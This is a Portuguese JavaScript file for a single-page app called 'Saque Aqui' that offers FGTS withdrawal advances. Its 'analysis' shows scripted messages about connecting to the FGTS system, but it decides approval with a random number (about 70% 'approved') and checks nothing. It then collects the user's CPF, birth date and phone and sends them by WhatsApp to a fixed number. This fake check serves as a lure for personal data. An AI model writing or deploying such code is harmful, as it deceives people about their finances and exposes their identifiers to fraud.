document.addEventListener('DOMContentLoaded', () => {

    // ===================================================
    // =========== Gerenciamento de Páginas (SPA) ========
    // ===================================================

    // Referências para os elementos de página
    const pages = {
        'welcome-page': document.getElementById('welcome-page'),
        'auth-page': document.getElementById('auth-page'),
        'simulation-page': document.getElementById('simulation-page'),
        'finaldata-page': document.getElementById('finaldata-page'),
        'privacy-page': document.getElementById('privacy-page')
    };
    let currentPageId = 'welcome-page';

    /**
     * Navega para uma nova página e atualiza o histórico do navegador.
     * @param {string} pageId - O ID da página de destino.
     * @param {boolean} pushState - Se deve adicionar uma nova entrada ao histórico.
     */
    const navigateTo = (pageId, pushState = true) => {
        if (!pages[pageId] || currentPageId === pageId) {
            return;
        }

        // Oculta a página atual
        if (pages[currentPageId]) {
            pages[currentPageId].classList.remove('active');
        }

        // Exibe a nova página
        const nextPage = pages[pageId];
        nextPage.classList.add('active');
        currentPageId = pageId;

        // Atualiza o histórico do navegador para o botão de voltar funcionar
        if (pushState) {
            window.history.pushState({ page: pageId }, '', `#${pageId}`);
        }
    };

    // Lida com o botão de voltar do navegador
    window.addEventListener('popstate', (event) => {
        const state = event.state;
        if (state && state.page) {
            navigateTo(state.page, false);
        } else {
            // Se não houver estado, volta para a tela inicial
            navigateTo('welcome-page', false);
        }
    });

    // Inicializa a página correta com base na URL
    const initialPage = window.location.hash.substring(1) || 'welcome-page';
    navigateTo(initialPage, false);


    // ===================================================
    // ============= Lógica e Funcionalidades ============
    // ===================================================

    // --- Mapeamento de Elementos ---
    const startButton = document.getElementById('startButton');
    const authButton = document.getElementById('authButton');
    const backButtons = document.querySelectorAll('.back-button');
    const simulateCpfButton = document.getElementById('simulateCpfButton');
    const finalizeWhatsappButton = document.getElementById('finalizeWhatsappButton');

    const cpfSimulationInput = document.getElementById('cpfSimulation');
    const cpfSimulationFeedback = document.getElementById('cpfSimulationFeedback');
    const cpfSimulationGroup = document.getElementById('cpfSimulationGroup');

    const loadingIndicator = document.getElementById('loadingIndicator');
    const progressFill = document.querySelector('.progress-fill');
    const loadingSteps = document.getElementById('loadingSteps');
    
    const simulationOutcomeMessage = document.getElementById('simulationOutcomeMessage');
    const outcomeTitle = document.getElementById('outcomeTitle');
    const outcomeText = document.getElementById('outcomeText');
    const outcomeIcon = document.getElementById('outcomeIcon');
    const actionButtonsContainer = document.getElementById('actionButtonsContainer');
    const bottomButtonContainer = document.getElementById('bottomButtonContainer');

    const cpfInput = document.getElementById('cpf');
    const dobInput = document.getElementById('dob');
    const phoneInput = document.getElementById('phone');
    const cpfFeedback = document.getElementById('cpfFeedback');
    const dobFeedback = document.getElementById('dobFeedback');
    const phoneFeedback = document.getElementById('phoneFeedback');

    const navMenu = document.getElementById('nav-menu');
    const menuOpenButtons = document.querySelectorAll('.menu-toggle-open');
    const menuCloseButton = document.querySelector('.menu-toggle-close');
    const menuLinks = document.querySelectorAll('.nav-link');
    const menuOverlay = document.getElementById('menu-overlay');
    const whatsappSupportButton = document.getElementById('whatsappSupport');

    // --- Funções de Máscara ---
    const applyCpfMask = (inputElement) => {
        if (!inputElement) return;
        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            if (value.length > 0) formattedValue += value.substring(0, 3);
            if (value.length > 3) formattedValue += '.' + value.substring(3, 6);
            if (value.length > 6) formattedValue += '.' + value.substring(6, 9);
            if (value.length > 9) formattedValue += '-' + value.substring(9, 11);
            e.target.value = formattedValue;
        });
    };
    
    const applyPhoneMask = (inputElement) => {
        if (!inputElement) return;
        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            if (value.length > 0) formattedValue += '(' + value.substring(0, 2);
            if (value.length >= 3) formattedValue += ') ' + value.substring(2, 7);
            if (value.length >= 8) formattedValue += '-' + value.substring(7, 11);
            e.target.value = formattedValue;
        });
    };

    // --- Validação de CPF ---
    const isValidCPF = (cpf) => {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
        let sum = 0;
        let remainder;
        for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (11 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(9, 10))) return false;
        sum = 0;
        for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (12 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(10, 11))) return false;
        return true;
    };

    // --- Efeito Visual de Clique nos Botões ---
    const applyClickEffect = (element) => {
        element.classList.add('active');
        setTimeout(() => {
            element.classList.remove('active');
        }, 300);
    };

    // --- Gerenciamento do Menu Lateral ---
    const openMenu = () => {
        navMenu.classList.add('active');
        document.body.classList.add('menu-open');
    };
    const closeMenu = () => {
        navMenu.classList.remove('active');
        document.body.classList.remove('menu-open');
    };

    // --- Event Listeners ---
    if (startButton) {
        startButton.addEventListener('click', () => {
            applyClickEffect(startButton);
            setTimeout(() => { navigateTo('auth-page'); }, 300);
        });
    }

    if (authButton) {
        authButton.addEventListener('click', () => {
            applyClickEffect(authButton);
            setTimeout(() => { navigateTo('simulation-page'); }, 300);
        });
    }

    if (backButtons) {
        backButtons.forEach(button => {
            button.addEventListener('click', (event) => {
                event.preventDefault();
                applyClickEffect(button);
                const targetPage = button.getAttribute('data-target');
                setTimeout(() => {
                    if (targetPage) {
                        navigateTo(targetPage);
                    } else {
                        window.history.back();
                    }
                }, 200);
            });
        });
    }

    if (menuOpenButtons) {
        menuOpenButtons.forEach(button => {
            button.addEventListener('click', () => {
                applyClickEffect(button);
                openMenu();
            });
        });
    }

    if (menuCloseButton) {
        menuCloseButton.addEventListener('click', () => {
            applyClickEffect(menuCloseButton);
            closeMenu();
        });
    }

    if (menuOverlay) {
        menuOverlay.addEventListener('click', () => {
            closeMenu();
        });
    }

    if (menuLinks) {
        menuLinks.forEach(link => {
            link.addEventListener('click', (event) => {
                event.preventDefault();
                applyClickEffect(link);
                const targetPage = link.getAttribute('data-target');
                setTimeout(() => {
                    closeMenu();
                    navigateTo(targetPage);
                }, 300);
            });
        });
    }

    if (whatsappSupportButton) {
        whatsappSupportButton.addEventListener('click', (event) => {
            event.preventDefault();
            applyClickEffect(whatsappSupportButton);
            const phoneNumber = '5511978311920';
            const message = encodeURIComponent(`Olá, gostaria de falar com a equipe de suporte sobre o aplicativo Saque Aqui.`);
            setTimeout(() => { window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank'); }, 200);
        });
    }

    if (simulateCpfButton) {
        applyCpfMask(cpfSimulationInput);

        simulateCpfButton.addEventListener('click', () => {
            applyClickEffect(simulateCpfButton);
            const cpf = cpfSimulationInput.value.replace(/\D/g, '');

            if (!isValidCPF(cpf)) {
                cpfSimulationFeedback.textContent = 'CPF inválido. Por favor, verifique o número.';
                cpfSimulationFeedback.style.display = 'block';
                cpfSimulationInput.focus();
                return;
            } else {
                cpfSimulationFeedback.style.display = 'none';
            }

            // Inicia a animação de simulação
            cpfSimulationGroup.style.display = 'none';
            bottomButtonContainer.style.display = 'none';
            simulationOutcomeMessage.style.display = 'none';
            loadingIndicator.style.display = 'flex';
            
            progressFill.style.width = '0%';

            let progress = 0;
            const messages = [
                'Conectando ao sistema FGTS...',
                'Validando dados do Saque-Aniversário...',
                'Analisando saldo e histórico de trabalho...',
                'Calculando a melhor proposta de antecipação...',
                'Finalizando a análise do sistema...'
            ];
            let currentMessageIndex = 0;
            loadingSteps.textContent = messages[currentMessageIndex];

            const interval = setInterval(() => {
                progress += 5;
                if (progressFill) progressFill.style.width = `${progress}%`;

                if (progress > 10 && progress <= 90 && progress % 20 === 0) {
                    currentMessageIndex++;
                    if (loadingSteps && currentMessageIndex < messages.length) {
                        loadingSteps.textContent = messages[currentMessageIndex];
                    }
                }

                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        loadingIndicator.style.display = 'none';
                        
                        const hasValue = Math.random() > 0.3; // Simulação de sucesso/falha

                        if (hasValue) {
                            outcomeIcon.className = 'outcome-icon fas fa-check-circle success-icon';
                            outcomeTitle.textContent = '🎉 Proposta Aprovada!';
                            outcomeText.innerHTML = 'Parabéns! Nosso sistema encontrou um valor disponível para você. Prossiga para o WhatsApp e libere seu saque.';
                            simulationOutcomeMessage.style.display = 'flex';
                            actionButtonsContainer.innerHTML = '';
                            const continueButton = document.createElement('button');
                            continueButton.className = 'main-button primary-orange interactive';
                            continueButton.innerHTML = '<i class="fab fa-whatsapp"></i> Liberar Meu FGTS Agora!';
                            continueButton.addEventListener('click', () => {
                                applyClickEffect(continueButton);
                                setTimeout(() => { navigateTo('finaldata-page'); }, 300);
                            });
                            actionButtonsContainer.appendChild(continueButton);
                        } else {
                            outcomeIcon.className = 'outcome-icon fas fa-times-circle error-icon';
                            outcomeTitle.textContent = '😔 Sem Saldo Disponível.';
                            outcomeText.innerHTML = 'Nosso sistema não identificou valores para saque neste momento. Fale com um especialista para mais informações.';
                            simulationOutcomeMessage.style.display = 'flex';
                            actionButtonsContainer.innerHTML = '';

                            const whatsappSupportButtonLocal = document.createElement('button');
                            whatsappSupportButtonLocal.className = 'main-button primary-orange interactive';
                            whatsappSupportButtonLocal.innerHTML = '<i class="fab fa-whatsapp"></i> Falar com Suporte';
                            whatsappSupportButtonLocal.addEventListener('click', () => {
                                applyClickEffect(whatsappSupportButtonLocal);
                                const phoneNumber = '5511978311920';
                                const message = encodeURIComponent(`Olá, após a simulação no aplicativo "Saque Aqui", não foi encontrado saldo para saque. Poderiam me ajudar?`);
                                setTimeout(() => { window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank'); }, 200);
                            });
                            actionButtonsContainer.appendChild(whatsappSupportButtonLocal);

                            const tryAgainButton = document.createElement('button');
                            tryAgainButton.className = 'main-button interactive';
                            tryAgainButton.innerHTML = '<i class="fas fa-redo-alt"></i> Tentar Novamente';
                            tryAgainButton.addEventListener('click', () => {
                                applyClickEffect(tryAgainButton);
                                setTimeout(() => {
                                    simulationOutcomeMessage.style.display = 'none';
                                    cpfSimulationGroup.style.display = 'block';
                                    bottomButtonContainer.style.display = 'flex';
                                    cpfSimulationInput.value = '';
                                    cpfSimulationInput.focus();
                                }, 300);
                            });
                            actionButtonsContainer.appendChild(tryAgainButton);
                        }
                    }, 800);
                }
            }, 80);
        });
    }

    if (finalizeWhatsappButton) {
        applyCpfMask(cpfInput);
        applyPhoneMask(phoneInput);

        finalizeWhatsappButton.addEventListener('click', () => {
            applyClickEffect(finalizeWhatsappButton);
            const cpf = cpfInput.value.replace(/\D/g, '');
            const dob = dobInput.value;
            const phone = phoneInput.value.replace(/\D/g, '');
            let isValid = true;

            if (!isValidCPF(cpf)) {
                cpfFeedback.textContent = 'CPF inválido. Verifique o número.';
                cpfFeedback.style.display = 'block';
                isValid = false;
            } else { cpfFeedback.style.display = 'none'; }
            if (!dob) {
                dobFeedback.textContent = 'Informe sua data de nascimento.';
                dobFeedback.style.display = 'block';
                isValid = false;
            } else { dobFeedback.style.display = 'none'; }
            if (phone.length < 10 || phone.length > 11) {
                phoneFeedback.textContent = 'Telefone inválido. Formato: (XX) XXXX-XXXX ou (XX) 9XXXX-XXXX';
                phoneFeedback.style.display = 'block';
                isValid = false;
            } else { phoneFeedback.style.display = 'none'; }

            if (!isValid) {
                // Se a validação falhar, foca no primeiro campo inválido
                if (!isValidCPF(cpf)) { cpfInput.focus(); }
                else if (!dob) { dobInput.focus(); }
                else if (phone.length < 10 || phone.length > 11) { phoneInput.focus(); }
                return;
            }

            if (isValid) {
                const formattedCpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                const formattedDob = dob.split('-').reverse().join('/');
                const formattedPhone = phoneInput.value;
                const messageContent = `Olá, gostaria de finalizar minha solicitação de Saque FGTS.\nMeus dados:\n- CPF: ${formattedCpf}\n- Data de Nasc.: ${formattedDob}\n- Telefone: ${formattedPhone}`;
                const phoneNumber = '5511978311920';
                const message = encodeURIComponent(messageContent);
                setTimeout(() => { window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank'); }, 200);
            }
        });
    }
});
